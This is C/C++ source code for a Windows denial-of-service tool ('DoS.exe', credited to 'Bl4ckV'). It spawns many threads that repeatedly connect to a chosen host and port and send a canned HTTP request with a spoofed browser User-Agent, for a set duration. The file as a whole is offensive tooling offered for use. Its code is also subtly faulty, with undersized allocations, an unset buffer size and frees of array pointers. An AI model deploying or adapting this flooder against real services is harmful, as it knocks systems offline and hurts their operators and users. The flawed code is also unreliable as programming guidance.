/*
=================================
Author - Bl4ckV
=================================
*/

#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32")

SOCKET* sockets;
WSADATA wsaData;
struct sockaddr_in sockAddr;
struct hostent* he;
BOOL timeFlag = TRUE;
char bufferPacket[] = "GET /toto HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: Mozilla/4.0"
"(compatible; MSIE 7.0; Windows NT 5.1; Trident / 4.0.NET CLR 1.1.4322;.NET CLR 2.0.503l3;."
"NET CLR 3.0.4506.2152;.NET CLR 3.5.30729; MSOffice 12)\r\nContent - Length: 42\r\n";

/*
	Struct wich will pass as parameter in CreateThread func
*/
typedef struct
{
	int socketId;
	DWORD sleepInterval;
	size_t bufferSize;
} ThreadParams;

/*
	Initialize necessary winsock structures
*/
void InitializeStructures(char* host, USHORT port)
{
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		WSACleanup();
		exit(EXIT_FAILURE);
	}

	if ((he = gethostbyname(host)) == nullptr)
	{
		fprintf(stderr, "-> Error. Enter a valid host name or ip address");
		WSACleanup();
		exit(EXIT_FAILURE);
	}

	sockAddr.sin_family = AF_INET;
	sockAddr.sin_port = htons(port);
	sockAddr.sin_addr.s_addr = inet_addr(inet_ntoa(*((struct in_addr*)he->h_addr_list[0])));
}

/*
	Duration of the DDoS
*/
void runTimer(unsigned int requestsDuration)
{
	for (unsigned int i = 0; i < requestsDuration; i++)
	{
		Sleep(1000);
	}
	timeFlag = FALSE;
}

/*
	Connect socket and send the buffer packet in loop until timeFlag would be false
*/
DWORD WINAPI ConnectAndSendBuf(LPVOID Param)
{
	ThreadParams threadParams = *static_cast<ThreadParams*>(Param);

	while (timeFlag)
	{
		closesocket(sockets[threadParams.socketId]);
		sockets[threadParams.socketId] = socket(AF_INET, SOCK_STREAM, 0);
		if (connect(sockets[threadParams.socketId], (SOCKADDR*)&sockAddr, sizeof(sockAddr)) == -1)
		{
			fprintf(stderr, "-> Error connecting socket with Id : %d\r\n", threadParams.socketId);
		}
		else
		{
			printf("-> Socket connected successfully with Id: %d\r\n", threadParams.socketId);
			char* buffer = (char*)malloc(threadParams.bufferSize);
			send(sockets[threadParams.socketId], bufferPacket, sizeof(bufferPacket), 0);
			printf("-> Buffer sent successfully with socket: %d\r\n", threadParams.socketId);
			free(buffer);
		}

		Sleep(threadParams.sleepInterval);
	}

	free(Param);
	return 0;
}

void ShowHelp()
{
	printf("DoS.exe [hostName] [port] [numOfThreads] [sleepInterval] [durationTime]");
}

void main(int argc, char** argv)
{
	if (argc < 6)
	{
		ShowHelp();
		exit(EXIT_FAILURE);
	}

	if (atoi(argv[2]) < 1 || atoi(argv[2]) > 65535)
	{
		fprintf(stderr, "-> Error. Enter a valid port (1 - 65535)");
		exit(EXIT_FAILURE);
	}

	InitializeStructures(argv[1], atoi(argv[2]));

	size_t threadsNum = atoi(argv[3]);

	sockets = (SOCKET*)malloc(threadsNum);

	ThreadParams* threadParams;
	threadParams = (ThreadParams*)malloc(threadsNum);

	for (size_t i = 0; i < threadsNum; i++)
	{
		threadParams[i].sleepInterval = atoi(argv[4]);
		threadParams[i].socketId = i;

		CreateThread(NULL, 0, ConnectAndSendBuf, (LPVOID)&threadParams[i], 0, NULL);
		Sleep(1);
	}

	runTimer(atoi(argv[5]));

	WSACleanup();
	free(sockets);
	free(threadParams);
}
